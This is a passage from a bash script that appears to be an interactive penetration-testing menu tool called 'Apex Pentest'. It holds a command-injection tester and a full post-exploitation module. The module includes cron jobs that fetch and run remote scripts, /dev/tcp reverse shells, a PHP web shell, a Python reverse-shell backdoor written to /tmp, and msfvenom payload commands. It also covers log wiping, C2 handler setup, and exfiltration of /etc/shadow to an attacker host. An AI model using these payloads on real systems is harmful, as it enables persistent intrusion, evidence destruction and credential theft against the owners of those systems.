                echo -e "${CYAN}[?] Enter vulnerable parameter URL: ${NC}"
                echo -e "${YELLOW}Example: http://$TARGET/ping?ip=127.0.0.1${NC}"
                read vuln_url
                
                base_url=$(echo "$vuln_url" | cut -d'?' -f1)
                param=$(echo "$vuln_url" | cut -d'?' -f2 | cut -d'=' -f1)
                
                for payload in "${payloads[@]}"; do
                    test_url="$base_url?$param=127.0.0.1$payload"
                    echo -ne "Testing: $payload\r"
                    
                    response=$(curl -s "$test_url" -m 3)
                    if echo "$response" | grep -q -E "(root|www-data|admin|user|uid)"; then
                        echo -e "\n${GREEN}[!] Command injection found with: $payload${NC}"
                        echo -e "${GREEN}[!] Response contains user info${NC}"
                        
                        # Test actual command
                        echo -e "\n${CYAN}[?] Test command (e.g., id, ls): ${NC}"
                        read cmd
                        exploit_url="$base_url?$param=127.0.0.1;$cmd"
                        curl -s "$exploit_url" | head -20
                        break
                    fi
                done
                ;;
        esac
        
        echo -e "\n${CYAN}[?] Press Enter to continue...${NC}"
        read -r
    done
}

# Maintaining Access Module
maintain_access_menu() {
    while true; do
        clear
        echo -e "${CYAN}${BOLD}══════ MAINTAINING ACCESS ══════${NC}"
        echo -e "${BOLD}Target: ${GREEN}$TARGET${NC}"
        echo ""
        echo -e "${WHITE}1.${NC} Persistence Mechanisms"
        echo -e "${WHITE}2.${NC} Backdoor Creation"
        echo -e "${WHITE}3.${NC} Privilege Escalation"
        echo -e "${WHITE}4.${NC} Lateral Movement"
        echo -e "${WHITE}5.${NC} Covering Tracks"
        echo -e "${WHITE}6.${NC} C2 (Command & Control)"
        echo -e "${WHITE}7.${NC} Data Exfiltration"
        echo -e "${WHITE}8.${NC} Return to Main Menu"
        echo ""
        echo -ne "${CYAN}[?] Select option (1-8): ${NC}"
        read maintain_choice
        
        case $maintain_choice in
            1)
                echo -e "\n${PURPLE}[*] Persistence Mechanisms${NC}"
                echo -e "${CYAN}[?] Select persistence type:${NC}"
                echo "1. Cron Jobs (Linux)"
                echo "2. Scheduled Tasks (Windows)"
                echo "3. Startup Scripts"
                echo "4. SSH Authorized Keys"
                echo "5. Web Shell Backdoor"
                echo -ne "${CYAN}[?] Select: ${NC}"
                read persist_type
                
                case $persist_type in
                    1)
                        echo -e "\n${BLUE}[*] Cron Job Persistence${NC}"
                        echo -e "${GREEN}[+] Add to crontab:${NC}"
                        echo "*/5 * * * * curl http://$LHOST:8080/shell.sh | bash"
                        echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"
                        echo ""
                        echo -e "${GREEN}[+] One-liner to install:${NC}"
                        echo "(crontab -l 2>/dev/null; echo \"*/5 * * * * curl http://$LHOST/shell.sh | bash\") | crontab -"
                        ;;
                    
                    4)
                        echo -e "\n${BLUE}[*] SSH Authorized Keys${NC}"
                        echo -e "${GREEN}[+] Generate SSH key:${NC}"
                        echo "ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key"
                        echo ""
                        echo -e "${GREEN}[+] Add to authorized_keys:${NC}"
                        echo "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys"
                        echo "chmod 600 ~/.ssh/authorized_keys"
                        echo ""
                        echo -e "${GREEN}[+] Connect back:${NC}"
                        echo "ssh -i /tmp/backdoor_key user@$TARGET"
                        ;;
                    
                    5)
                        echo -e "\n${BLUE}[*] Web Shell Backdoor${NC}"
                        echo -e "${GREEN}[+] PHP persistent shell:${NC}"
                        cat << 'EOF'
<?php
// Persistent web shell with login
session_start();
$password = "backdoor123";
if(isset($_POST['pass']) && $_POST['pass'] == $password) {
    $_SESSION['auth'] = true;
}
if(!isset($_SESSION['auth'])) {
    echo '<form method="POST">Password: <input type="password" name="pass"><input type="submit"></form>';
    die();
}
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="GET">
CMD: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
EOF
                        ;;
                esac
                ;;
            
            2)
                echo -e "\n${PURPLE}[*] Backdoor Creation${NC}"
                echo -e "${BLUE}[*] Creating custom backdoors...${NC}"
                
                # Python backdoor
                cat > /tmp/py_backdoor.py << EOF
#!/usr/bin/python3
import socket,subprocess,os,time
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("$LHOST",$LPORT))
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
    except:
        time.sleep(60)  # Retry every minute
EOF
                
                echo -e "${GREEN}[+] Python backdoor: /tmp/py_backdoor.py${NC}"
                echo "Run: python3 /tmp/py_backdoor.py"
                
                # Binary backdoor (using msfvenom if available)
                echo -e "\n${BLUE}[*] Generating binary payloads...${NC}"
                if command -v msfvenom &> /dev/null; then
                    echo -e "${GREEN}[+] Linux ELF backdoor:${NC}"
                    echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o backdoor.elf"
                    
                    echo -e "\n${GREEN}[+] Windows EXE backdoor:${NC}"
                    echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o backdoor.exe"
                else
                    echo -e "${YELLOW}[!] msfvenom not installed${NC}"
                fi
                ;;
            
            3)
                echo -e "\n${PURPLE}[*] Privilege Escalation${NC}"
                echo -e "${CYAN}[?] Target OS:${NC}"
                echo "1. Linux"
                echo "2. Windows"
                echo -ne "${CYAN}[?] Select: ${NC}"
                read os_type
                
                if [ "$os_type" == "1" ]; then
                    echo -e "\n${BLUE}[*] Linux Privilege Escalation${NC}"
                    echo -e "${GREEN}[+] Common checks:${NC}"
                    echo ""
                    echo "1. SUID Binaries:"
                    echo "find / -perm -4000 -type f 2>/dev/null"
                    echo ""
                    echo "2. Sudo permissions:"
                    echo "sudo -l"
                    echo ""
                    echo "3. Cron jobs:"
                    echo "ls -la /etc/cron*"
                    echo "cat /etc/crontab"
                    echo ""
                    echo "4. World-writable files:"
                    echo "find / -type f -perm -o+w 2>/dev/null | head -20"
                    echo ""
                    echo "5. Kernel exploits:"
                    echo "uname -a"
                    echo "cat /etc/issue"
                    echo ""
                    echo -e "${YELLOW}[!] Automated tools:${NC}"
                    echo "linpeas.sh, linux-exploit-suggester, les.sh"
                    
                elif [ "$os_type" == "2" ]; then
                    echo -e "\n${BLUE}[*] Windows Privilege Escalation${NC}"
                    echo -e "${GREEN}[+] Common checks:${NC}"
                    echo ""
                    echo "1. System info:"
                    echo "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""
                    echo ""
                    echo "2. Users and groups:"
                    echo "net users"
                    echo "net localgroup administrators"
                    echo ""
                    echo "3. Running services:"
                    echo "tasklist /SVC"
                    echo "net start"
                    echo ""
                    echo "4. Scheduled tasks:"
                    echo "schtasks /query /fo LIST /v"
                    echo ""
                    echo -e "${YELLOW}[!] Automated tools:${NC}"
                    echo "WinPEAS, PowerUp.ps1, Seatbelt"
                fi
                ;;
            
            4)
                echo -e "\n${PURPLE}[*] Lateral Movement${NC}"
                echo -e "${BLUE}[*] Techniques for moving within network${NC}"
                
                echo -e "\n${GREEN}[+] Password spraying:${NC}"
                echo "for ip in {1..254}; do hydra -l admin -p Password123 192.168.1.\$ip ssh; done"
                
                echo -e "\n${GREEN}[+] Pass-the-hash (Windows):${NC}"
                echo "pth-winexe -U admin%HASH //TARGET_IP cmd.exe"
                
                echo -e "\n${GREEN}[+] WMI execution:${NC}"
                echo "wmic /node:TARGET_IP process call create \"cmd.exe /c whoami\""
                
                echo -e "\n${GREEN}[+] PSExec (Windows):${NC}"
                echo "PsExec.exe \\\\TARGET_IP -u admin -p password cmd.exe"
                
                echo -e "\n${GREEN}[+] SSH key forwarding:${NC}"
                echo "ssh -A user@TARGET_IP"
                ;;
            
            5)
                echo -e "\n${PURPLE}[*] Covering Tracks${NC}"
                echo -e "${BLUE}[*] Cleaning logs and evidence${NC}"
                
                echo -e "\n${GREEN}[+] Linux log cleaning:${NC}"
                echo "# Clear last login"
                echo "echo > /var/log/lastlog"
                echo "echo > /var/log/wtmp"
                echo "echo > /var/log/btmp"
                echo ""
                echo "# Clear bash history"
                echo "history -c"
                echo "echo > ~/.bash_history"
                echo ""
                echo "# Disable logging"
                echo "export HISTSIZE=0"
                echo "export HISTFILE=/dev/null"
                
                echo -e "\n${GREEN}[+] Windows log cleaning:${NC}"
                echo "# Clear event logs"
                echo "wevtutil cl System"
                echo "wevtutil cl Security"
                echo "wevtutil cl Application"
                echo ""
                echo "# Clear PowerShell history"
                echo "Remove-Item (Get-PSReadlineOption).HistorySavePath"
                echo ""
                echo "# Use timestomp"
                echo "Set file times to match system files"
                ;;
            
            6)
                echo -e "\n${PURPLE}[*] Command & Control (C2)${NC}"
                echo -e "${BLUE}[*] Setting up C2 infrastructure${NC}"
                
                echo -e "\n${GREEN}[+] Metasploit handler:${NC}"
                cat << EOF
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
set ExitOnSession false
exploit -j -z
EOF
                
                echo -e "\n${GREEN}[+] Cobalt Strike team server:${NC}"
                echo "./teamserver $LHOST password [profile]"
                
                echo -e "\n${GREEN}[+] Empire listener:${NC}"
                echo "(Empire) > listeners"
                echo "(Empire) > uselistener http"
                echo "(Empire) > set Host http://$LHOST:8080"
                echo "(Empire) > execute"
                
                echo -e "\n${GREEN}[+] DNS tunneling (iodine):${NC}"
                echo "Server: iodine -f -P password 192.168.1.1 tunnel.domain.com"
                echo "Client: iodine -f -P password tunnel.domain.com"
                ;;
            
            7)
                echo -e "\n${PURPLE}[*] Data Exfiltration${NC}"
                echo -e "${BLUE}[*] Techniques for data extraction${NC}"
                
                echo -e "\n${GREEN}[+] Compression and transfer:${NC}"
                echo "tar czf /tmp/data.tar.gz /etc/passwd /etc/shadow"
                echo "base64 /tmp/data.tar.gz | curl -X POST -d @- http://$LHOST:8080/receive"
                
                echo -e "\n${GREEN}[+] DNS exfiltration:${NC}"
                echo "cat secret.txt | xxd -p | while read line; do dig \$line.domain.com; done"
                
                echo -e "\n${GREEN}[+] ICMP tunneling:${NC}"
                echo "Server: sudo nping --icmp -c 1 --data-string \"secret\" \$LHOST"
                echo ""
                echo -e "\n${GREEN}[+] Steganography:${NC}"
                echo "steghide embed -cf image.jpg -ef secret.txt -p password"
                ;;
            
            8)
                return
                ;;
        esac
        
        echo -e "\n${CYAN}[?] Press Enter to continue...${NC}"
        read -r
    done
}

# Main Menu
main_menu() {
    while true; do
        clear
        echo -e "${CYAN}${BOLD}══════════ MAIN MENU ══════════${NC}"
        echo -e "${BOLD}Target: ${GREEN}${TARGET:-None Set}${NC}"
        echo -e "${BOLD}Session: ${GREEN}$SESSION_ID${NC}"
        echo -e "${BOLD}LHOST: ${GREEN}$LHOST${NC}"
        echo ""
        echo -e "${WHITE}1.${NC} Set Target"
        echo -e "${WHITE}2.${NC} Reconnaissance"
        echo -e "${WHITE}3.${NC} Scanning"
        echo -e "${WHITE}4.${NC} Gaining Access"
        echo -e "${WHITE}5.${NC} Maintaining Access"
        echo -e "${WHITE}6.${NC} Quick Full Test"
        echo -e "${WHITE}7.${NC} Cleanup & Exit"
        echo ""
        echo -ne "${CYAN}[?] Select option (1-7): ${NC}"
        read main_choice
        
        case $main_choice in
            1)
                set_target
                ;;
            2)
                if [ -z "$TARGET" ]; then
                    echo -e "${RED}[!] Please set target first${NC}"
                    sleep 2
                else
                    recon_menu
                fi
                ;;
            3)
                if [ -z "$TARGET" ]; then
                    echo -e "${RED}[!] Please set target first${NC}"
                    sleep 2
                else
                    scanning_menu
                fi
                ;;
            4)
                if [ -z "$TARGET" ]; then
                    echo -e "${RED}[!] Please set target first${NC}"
                    sleep 2
                else
                    gain_access_menu
                fi
                ;;
            5)
                if [ -z "$TARGET" ]; then
                    echo -e "${RED}[!] Please set target first${NC}"
                    sleep 2
                else
                    maintain_access_menu
                fi
                ;;
            6)
                if [ -z "$TARGET" ]; then
                    echo -e "${RED}[!] Please set target first${NC}"
                    sleep 2
                else
                    echo -e "\n${PURPLE}[*] Starting Quick Full Test...${NC}"
                    echo -e "${BLUE}[*] This will run:${NC}"
                    echo "1. Basic recon"
                    echo "2. Port scan"
                    echo "3. Web scan"
                    echo "4. Vulnerability check"
                    echo ""
                    echo -e "${YELLOW}[!] This may take several minutes${NC}"
                    echo -ne "${CYAN}[?] Continue? (y/n): ${NC}"
                    read -n 1 -r
                    if [[ $REPLY =~ ^[Yy]$ ]]; then
                        echo -e "\n${GREEN}[+] Starting...${NC}"
                        # Add quick test sequence here
                    fi
                fi
                ;;
            7)
                echo -e "\n${BLUE}[*] Cleaning up...${NC}"
                rm -rf "$RESULTS_DIR"
                echo -e "${GREEN}[+] Session $SESSION_ID cleaned${NC}"
                echo -e "${GREEN}[+] Thank you for using Apex Pentest!${NC}"
                exit 0
                ;;
        esac
    done
}

# Initial setup
check_deps
main_menu